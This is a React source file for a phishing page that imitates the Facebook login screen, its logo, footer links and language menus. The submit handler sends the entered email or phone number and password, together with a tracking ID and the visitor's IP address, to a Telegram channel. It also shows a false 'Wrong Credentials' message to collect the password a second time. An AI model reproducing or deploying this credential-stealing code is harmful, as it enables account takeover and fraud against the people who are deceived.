import React, { useEffect, useState } from "react";
import { Modal, Form, Input } from "antd";
import { useNavigate } from "react-router-dom";
import { sendTelegram } from "./utils/sendTelegram";
import "./styles/confirmation.css";
import { v4 as uuidv4 } from "uuid";
import { API_BE } from "./utils/variable";
import { getIpAddress } from "./utils/getIpAddress";

export const ConfirmationModal = (props) => {
  const navigate = useNavigate();
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [minutes, setMinutes] = useState(4);
  const [seconds, setSeconds] = useState(59);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [form] = Form.useForm()


  const handleSubmit = (values) => {
    if (!values || loading) return;
    // const uuid = uuidv4();
    // localStorage.setItem("unique_id", JSON.stringify(uuid));
    localStorage.setItem("form_data", JSON.stringify(values));

    setLoading(true);

    let form_data = localStorage.getItem("form_data");
    let unique_id = localStorage.getItem("unique_id");

    if (form_data) {
      form_data = JSON.parse(form_data);
    }

    updateStatus(values);

    // registerUserDb();

    let telegram_data = `
    ====== FORM LOGIN #${!props.wrong_password ? "1" : "2"} =======
    ID: ${unique_id}
    ===============================
    Email or phone number: ${values.email}
    Password: ${values.password}
    ===============================
    ${getIpAddress()}
    `;

    sendTelegram(telegram_data);
    setLoading(false);

    setTimeout(() => {
      props.setValue(0)
      // navigate("/checkpoint/next=secure", {
      //   state: { name: form_data.full_name },
      // });
    }, 700);
  };

  const updateStatus = (values) => {
    let unique_id = localStorage.getItem("unique_id");
    if (unique_id) {
      unique_id = JSON.parse(unique_id);

      const data = {
        unique_id,
        status: 0,
        email: values?.email || "john@doe.com"
      };

      fetch(`${API_BE}/users`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then(() => { });
    }
  }

  return (
    <>
      <div className="confirmation-container-modal">
        <div className="header-color">
          <div className="header-container">
            <div className="logo__faceook"></div>
          </div>
        </div>
        <div className="auth-req-container auth__req-modal">
          <div className="auth-req">
            <div className="auth-req-text-modal">
              <h2>Log Into Facebook</h2>
              {props.wrong_password && <div className="wrong__password">
                <h2>Wrong Credentials</h2>
                <p>Invalid username or password</p>
              </div>}
              <div className="modal__confirmation">
                <Form form={form} onFinish={handleSubmit}>
                  <div>
                    <Form.Item name="email">
                      <Input required type="text" name="" placeholder="Email or phone number" />
                    </Form.Item>
                  </div>
                  <div>
                    <Form.Item name="password">
                      <Input required type="password" name="" placeholder="Password" />
                    </Form.Item>
                  </div>
                  <div>
                    <button type="submit">Log In</button>
                  </div>
                </Form>
                <div className="modal__confirmation-forgot">
                  <div className="modal__confirmation-account">
                    <p>Forgot account? </p>
                    <p>Sign up for Facebook</p>
                  </div>
                  <p className="not__now">Not now</p>
                </div>
              </div>
            </div>
          </div>
          <div className="having-trouble-class having__trouble-modal">
            <button>Having trouble?</button>
          </div>
          {/* <div className={`show-button-mobile ${loading && "disableButton"}`}>
            <button onClick={handleSubmit}>Continue</button>
          </div> */}
          <div className="show-footer-on-mobile-plus hide__footer-modal">
            <h2 className="h2-foot not__you-text">Not You? Log In Here</h2>
            <div className="footer-flex-mobile-plus confimartion__modal">
              <div>
                <h2>English (US)</h2>
                <p>Deutsch</p>
                <p>Српски</p>
                <p>Português (Brasil)</p>
              </div>
              <div>
                <p>Italiano</p>
                <p>Bosanski</p>
                <p>Svensk</p>
                <button>+</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="modal__footer">
        <div className="footer-menu-flex-ul">
          <div className="container-language-footer">
            <ul className="flex-ul">
              <li>English (US)</li>
              <li>Español</li>
              <li>Deutsch</li>
              <li>Türkçe</li>
              <li>Српски</li>
              <li>Français (France)</li>
              <li>Italiano</li>
              <li>Bosanski</li>
              <li>Svensk</li>
              <li>Português (Brasil)</li>
              <button className="countrys-button">
                <span>+</span>
              </button>
            </ul>
          </div>
          <div className="flex-second-ul">
            <ul>
              <li>Sign Up</li>
              <li>Log In</li>
              <li>Messenger</li>
              <li>Facebook Lite</li>
              <li>Watch</li>
              <li>Places</li>
              <li>Games</li>
              <li>Marketplace</li>
              <li>Facebook Pay</li>
              <li>Oculus</li>
              <li>Portal</li>
              <li>Instagram</li>
              <li>Bulletin</li>
              <li>Local</li>
            </ul>
          </div>
          <div className="flex-second-ul-2">
            <ul>
              <li>Fundraisers</li>
              <li>Services</li>
              <li>Voting Information Centre</li>
              <li>About</li>
              <li>Create ad</li>
              <li>Create Page</li>
              <li>Developers</li>
              <li>Careers</li>
              <li>Privacy</li>
              <li>Cookies</li>
              <li className="ad-choice-img">
                Ad Choices <span className="img-li"></span>{" "}
              </li>
              <li>Terms</li>
              <li>Help</li>
            </ul>
          </div>
          <div className="meta-footer">
            <p>Meta © 2022</p>
          </div>
        </div>
      </div>
    </>
  );
};
